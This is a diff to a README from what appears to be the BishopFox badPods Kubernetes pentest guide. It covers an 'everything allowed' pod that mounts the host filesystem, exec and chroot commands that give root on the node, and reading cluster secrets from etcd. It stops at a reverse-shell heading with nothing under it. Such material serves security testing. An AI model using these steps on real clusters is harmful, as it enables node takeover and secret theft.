@@ -1,4 +1,4 @@
-# Bad Pod #1 - Everything allowed: You can create a pod with all the things
+# Bad Pod #1: Everything allowed
 
 The pod you create mounts the host’s filesystem to the pod. You’ll have the best luck if you can schedule your pod on a control-plane node using the nodeName selector in your manifest. You then exec into your pod and chroot to the directory where you mounted the host’s filesystem. You now have root on the node running your pod. 
 * **Read secrets from etcd** – If you can run your pod on a control-plane node using the nodeName selector in the pod spec, you might have easy access to the etcd database, which contains all of the configuration for the cluster, including all secrets. 
@@ -10,11 +10,11 @@ The pod you create mounts the host’s filesystem to the pod. You’ll have the 
 ## Create a pod you can exec into
 Create pod
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/everything-allowed.yaml 
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/everything-exec-pod-allowed.yaml 
 ```
 Exec into pod 
 ```bash
-kubectl exec -it everything-allowed -- chroot /host
+kubectl exec -it everything-exec-pod-allowed -- chroot /host
 ```
 
 ## Reverse shell pod
